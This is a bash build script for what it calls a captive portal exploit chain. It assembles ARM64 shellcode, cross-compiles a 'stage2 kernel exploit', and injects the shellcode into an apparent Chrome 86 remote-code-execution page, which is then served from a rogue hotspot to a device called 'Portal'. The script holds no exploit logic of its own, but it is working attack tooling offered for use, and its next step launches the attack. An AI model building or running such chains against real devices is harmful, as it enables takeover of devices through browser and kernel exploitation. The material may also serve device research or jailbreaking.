#!/usr/bin/env bash
# build_payload.sh — Build all payloads for the captive portal exploit chain
#
# RISK: ZERO — compilation only, no device interaction
# Requires: clang (macOS), Docker OR Android NDK (for ARM64 Linux cross-compilation)
#
# Usage: ./build_payload.sh [--shellcode-only] [--stage2-only] [--all]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PAYLOAD_DIR="$(cd "$SCRIPT_DIR/../payloads" && pwd)"
WWW_DIR="$(cd "$SCRIPT_DIR/../www/exploit" && pwd)"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
err() { echo -e "${RED}[-]${NC} $1" >&2; }

# =========================================================================
# Step 1: Assemble ARM64 shellcode
# =========================================================================
build_shellcode() {
    log "Building ARM64 shellcode..."

    local src="$PAYLOAD_DIR/shellcode_arm64.S"
    local obj="$PAYLOAD_DIR/shellcode.o"
    local bin="$PAYLOAD_DIR/shellcode.bin"
    local js="$PAYLOAD_DIR/shellcode_bytes.js"

    if [ ! -f "$src" ]; then
        err "Shellcode source not found: $src"
        return 1
    fi

    # Assemble with clang targeting AArch64 Linux
    # Apple clang can cross-assemble for ARM64
    if clang -target aarch64-linux-gnu -c "$src" -o "$obj" 2>/dev/null; then
        log "Assembled with clang -target aarch64-linux-gnu"
    elif clang -target aarch64-unknown-linux-gnu -c "$src" -o "$obj" 2>/dev/null; then
        log "Assembled with clang -target aarch64-unknown-linux-gnu"
    else
        err "Failed to assemble shellcode. clang cannot target aarch64-linux-gnu"
        err "Try: brew install llvm (for full LLVM toolchain)"
        return 1
    fi

    # Extract .text section as raw binary
    if command -v llvm-objcopy >/dev/null 2>&1; then
        llvm-objcopy -O binary -j .text "$obj" "$bin"
    elif command -v objcopy >/dev/null 2>&1; then
        objcopy -O binary -j .text "$obj" "$bin"
    else
        # Fallback: use Python to extract .text from ELF
        python3 -c "
import struct, sys
with open('$obj', 'rb') as f:
    data = f.read()
# Parse ELF header
ident = data[:16]
if ident[:4] != b'\\x7fELF':
    print('Not an ELF file', file=sys.stderr)
    sys.exit(1)
is64 = ident[4] == 2
le = ident[5] == 1
fmt = '<' if le else '>'
if is64:
    e_shoff = struct.unpack(fmt+'Q', data[40:48])[0]
    e_shentsize = struct.unpack(fmt+'H', data[58:60])[0]
    e_shnum = struct.unpack(fmt+'H', data[60:62])[0]
    e_shstrndx = struct.unpack(fmt+'H', data[62:64])[0]
    # Read section headers
    sections = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        sh_name = struct.unpack(fmt+'I', data[off:off+4])[0]
        sh_type = struct.unpack(fmt+'I', data[off+4:off+8])[0]
        sh_offset = struct.unpack(fmt+'Q', data[off+24:off+32])[0]
        sh_size = struct.unpack(fmt+'Q', data[off+32:off+40])[0]
        sections.append((sh_name, sh_type, sh_offset, sh_size))
    # Get string table
    strtab_off = sections[e_shstrndx][2]
    strtab_sz = sections[e_shstrndx][3]
    strtab = data[strtab_off:strtab_off+strtab_sz]
    # Find .text
    for sh_name, sh_type, sh_offset, sh_size in sections:
        name = strtab[sh_name:strtab.index(b'\\x00', sh_name)].decode()
        if name == '.text':
            with open('$bin', 'wb') as out:
                out.write(data[sh_offset:sh_offset+sh_size])
            print(f'.text section: {sh_size} bytes')
            sys.exit(0)
    print('.text section not found', file=sys.stderr)
    sys.exit(1)
"
    fi

    local size
    size=$(wc -c < "$bin" | tr -d ' ')
    log "Shellcode binary: $bin ($size bytes)"

    # Generate JavaScript byte array
    python3 -c "
import sys
with open('$bin', 'rb') as f:
    data = f.read()
# Find _data offset (look for 8-byte aligned region of zeros after code)
# The _data section has two 8-byte zero quads followed by the path string
path = b'/data/local/tmp/s2'
try:
    path_idx = data.index(path)
    data_offset = path_idx - 16  # _data is 16 bytes before path
    print(f'// _data offset: {data_offset} (0x{data_offset:x})')
    print(f'// path offset:  {path_idx} (0x{path_idx:x})')
except ValueError:
    data_offset = -1
    print('// WARNING: could not find _data section in shellcode')
    print('// Shellcode may need manual offset calculation')

print(f'const SHELLCODE_SIZE = {len(data)};')
if data_offset > 0:
    print(f'const SHELLCODE_DATA_OFFSET = {data_offset};')
print('const SHELLCODE = new Uint8Array([')
for i in range(0, len(data), 16):
    chunk = data[i:i+16]
    hex_str = ', '.join(f'0x{b:02x}' for b in chunk)
    print(f'    {hex_str},')
print(']);')
" > "$js"

    log "JavaScript shellcode array: $js"
    rm -f "$obj"
}

# =========================================================================
# Step 2: Cross-compile stage2 kernel exploit
# =========================================================================
build_stage2() {
    log "Building stage2 kernel exploit..."

    local src="$PAYLOAD_DIR/stage2_kernel.c"
    local hdr="$PAYLOAD_DIR/portal_offsets.h"
    local out="$PAYLOAD_DIR/stage2"

    if [ ! -f "$src" ]; then
        err "Stage2 source not found: $src"
        return 1
    fi

    if [ ! -f "$hdr" ]; then
        err "Portal offsets header not found: $hdr"
        return 1
    fi

    # Try multiple cross-compilation methods
    local compiled=false

    # Method 1: Android NDK (preferred)
    if [ -n "${ANDROID_NDK_HOME:-}" ] && [ -d "$ANDROID_NDK_HOME" ]; then
        local ndk_cc
        ndk_cc=$(find "$ANDROID_NDK_HOME" -name "aarch64-linux-android*-clang" -type f 2>/dev/null | sort -V | tail -1)
        if [ -n "$ndk_cc" ]; then
            log "Using Android NDK: $ndk_cc"
            "$ndk_cc" -static -O2 -Wall -I"$PAYLOAD_DIR" -o "$out" "$src" -DANDROID
            compiled=true
        fi
    fi

    # Method 2: Homebrew cross-compiler
    if [ "$compiled" = false ]; then
        for cc in aarch64-linux-gnu-gcc aarch64-unknown-linux-gnu-gcc aarch64-elf-gcc; do
            if command -v "$cc" >/dev/null 2>&1; then
                log "Using: $cc"
                "$cc" -static -O2 -Wall -I"$PAYLOAD_DIR" -o "$out" "$src"
                compiled=true
                break
            fi
        done
    fi

    # Method 3: Docker
    if [ "$compiled" = false ] && command -v docker >/dev/null 2>&1; then
        log "Using Docker for cross-compilation..."
        docker run --rm \
            -v "$PAYLOAD_DIR:/src" \
            --platform linux/arm64 \
            gcc:12 \
            gcc -static -O2 -Wall -I/src -o /src/stage2 /src/stage2_kernel.c
        compiled=true
    fi

    # Method 4: zig cc (if available)
    if [ "$compiled" = false ] && command -v zig >/dev/null 2>&1; then
        log "Using zig cc for cross-compilation..."
        zig cc -target aarch64-linux-gnu -static -O2 -Wall -I"$PAYLOAD_DIR" -o "$out" "$src"
        compiled=true
    fi

    if [ "$compiled" = false ]; then
        err "No ARM64 Linux cross-compiler found!"
        err "Install one of:"
        err "  brew install aarch64-unknown-linux-gnu  (Homebrew)"
        err "  brew install zig                        (Zig toolchain)"
        err "  Install Android NDK and set ANDROID_NDK_HOME"
        err "  Install Docker"
        return 1
    fi

    # Strip symbols to reduce size
    for strip_cmd in aarch64-linux-gnu-strip aarch64-unknown-linux-gnu-strip llvm-strip strip; do
        if command -v "$strip_cmd" >/dev/null 2>&1; then
            "$strip_cmd" "$out" 2>/dev/null && break
        fi
    done

    local size
    size=$(wc -c < "$out" | tr -d ' ')
    log "Stage2 binary: $out ($size bytes)"

    # Verify it's the right architecture
    if command -v file >/dev/null 2>&1; then
        local filetype
        filetype=$(file "$out")
        if echo "$filetype" | grep -q "aarch64\|ARM aarch64"; then
            log "Architecture verified: ARM64"
        else
            warn "Unexpected file type: $filetype"
        fi
    fi
}

# =========================================================================
# Step 3: Inject shellcode into exploit HTML
# =========================================================================
inject_shellcode() {
    log "Injecting shellcode into exploit HTML..."

    local js="$PAYLOAD_DIR/shellcode_bytes.js"
    local html="$WWW_DIR/rce_chrome86.html"

    if [ ! -f "$js" ]; then
        err "Shellcode JS not found: $js — run --shellcode-only first"
        return 1
    fi

    if [ ! -f "$html" ]; then
        err "Exploit HTML not found: $html"
        return 1
    fi

    # The HTML has a placeholder: /*SHELLCODE_PLACEHOLDER*/
    # Replace it with the actual shellcode bytes
    local shellcode_content
    shellcode_content=$(cat "$js")

    python3 -c "
import sys
with open('$html', 'r') as f:
    html = f.read()
with open('$js', 'r') as f:
    shellcode = f.read()
if '/*SHELLCODE_PLACEHOLDER*/' in html:
    html = html.replace('/*SHELLCODE_PLACEHOLDER*/', shellcode)
    with open('$html', 'w') as f:
        f.write(html)
    print('Shellcode injected successfully')
else:
    print('Placeholder not found in HTML (shellcode may already be injected)')
"
    log "Exploit HTML updated with shellcode"
}

# =========================================================================
# Main
# =========================================================================
case "${1:---all}" in
    --shellcode-only)
        build_shellcode
        ;;
    --stage2-only)
        build_stage2
        ;;
    --inject-only)
        inject_shellcode
        ;;
    --all)
        build_shellcode
        build_stage2
        inject_shellcode
        log "All payloads built successfully!"
        echo ""
        log "Files:"
        log "  Shellcode:  $PAYLOAD_DIR/shellcode.bin"
        log "  Stage2:     $PAYLOAD_DIR/stage2"
        log "  Exploit:    $WWW_DIR/rce_chrome86.html"
        echo ""
        log "Next: Start the captive portal and connect the Portal"
        log "  sudo ./setup_hotspot.sh --exploit"
        ;;
    *)
        echo "Usage: $0 [--shellcode-only|--stage2-only|--inject-only|--all]"
        exit 1
        ;;
esac
